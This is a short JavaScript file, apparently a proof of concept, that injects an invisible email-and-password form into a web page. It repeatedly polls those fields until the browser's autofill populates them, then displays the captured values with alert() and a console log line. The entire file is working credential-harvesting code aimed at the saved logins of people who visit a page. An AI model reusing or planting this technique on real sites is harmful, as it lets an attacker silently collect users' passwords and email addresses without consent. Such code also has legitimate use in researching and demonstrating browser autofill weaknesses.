var injectForm = function(visible) {
  console.log("Injecting the form");
  var container = document.createElement('div');
  if (!visible){
    container.style.display = 'none';
  }
  var form = document.createElement('form');
  form.attributes.autocomplete = 'on';
  var emailInput = document.createElement('input');
  emailInput.attributes.vcard_name = 'vCard.Email';
  emailInput.id = 'email';
  emailInput.type = 'email';
  emailInput.name = 'email';
  form.appendChild(emailInput);
  var passwordInput = document.createElement('input');
  passwordInput.id = 'password';
  passwordInput.type = 'password';
  passwordInput.name = 'password';
  form.appendChild(passwordInput);
  container.appendChild(form);
  document.body.appendChild(container);  
};

var printResult = function(elementId, sniffedValue){
  console.log("omri:" + sniffedValue );
  alert(sniffedValue);
};

var sniffInputField = function(fieldId){
  var inputElement = document.getElementById(fieldId);
  if (inputElement && inputElement.value.length && (fieldId == "password" || fieldId == "email")){
    printResult(fieldId, inputElement.value);    
  }else{
    window.setTimeout(sniffInputField, 200, fieldId);  
  }
};

var sniffInputFields = function(){  
  var inputs = document.getElementsByTagName('input');
  for (var i = 0; i < inputs.length; i++) {
    sniffInputField(inputs[i].id);
	
  }
};

var sniffFormInfo = function(visible) {
  injectForm(visible);
  sniffInputFields();
};

var visible_form=false;  
sniffFormInfo(visible_form);
